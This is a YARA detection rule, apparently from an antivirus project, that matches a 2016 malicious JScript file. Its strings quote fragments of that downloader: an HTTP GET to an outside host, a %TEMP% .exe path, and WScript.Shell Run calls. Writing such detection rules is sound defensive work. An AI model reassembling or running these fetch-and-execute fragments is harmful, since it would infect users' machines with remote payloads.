rule sig_20160328_9d52b1fbb8130b262fe589ae9b046f9e {
  meta:
    description = "datamaliciousorder - file 20160328_9d52b1fbb8130b262fe589ae9b046f9e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b0c844c0cf3fd3a6446f64a4f9f3e196da65e7bdd0be1df15faa2972996169fc"

  strings:
    $s1  = "function Zutgoccvk() {return Dffcy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"20qALCXOB1OSA.exe\";};" fullword ascii
    $s2  = "Mvxdhfr[Gkhzpsdxr](\"GET\", \"http://gettouronline.com/sd4la\", false);" fullword ascii
    $s3  = "do {WScript[Vdzztpp](Bziape() * 11)} while (Mvxdhfr[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Dffcy = function Riasay() {return WScript[Gfaow](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Dlyybebuy(Kgwdjdteu, Agkmfr){return Kgwdjdteu - Agkmfr;};" fullword ascii
    $s6  = "function Kdwjcsdus(Ovunqzh){Dffcy[\"Run\"](Ovunqzh, Ttuju, Ttuju);};" fullword ascii
    $s7  = "function Xnvdiaktt() {return ((Ooieozn == true) && (Ooieozn == Lxzhbksn)) ? 1 : Ttuju;};" fullword ascii
    $s8  = "var Dogpeud = new this[\"Date\"]();" fullword ascii
    $s9  = "function Vdddurehax(){return Gfaow;};" fullword ascii
    $s10 = "var Ooieozn = false;" fullword ascii
    $s11 = "function Xtjmrbvhm(Fnuir) {var Iglhvk = (1, 2, 3, 4, 5, Fnuir); return Iglhvk;};" fullword ascii
    $s12 = "var Kjsui = false;" fullword ascii
    $s13 = "function Bziape(){return 22;};" fullword ascii
    $s14 = "function Kazwpjxqgp()" fullword ascii
    $s15 = "Ooieozn = true; " fullword ascii
    $s16 = "Lxzhbksn = true; " fullword ascii
    $s17 = "var Lxzhbksn = false;" fullword ascii
    $s18 = "function Oklyhn(){return Xrqkapm;};" fullword ascii
    $s19 = " while (Sixcrid){" fullword ascii
    $s20 = "return Dlyybebuy(Sptbjkkpf, Ctcizc);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}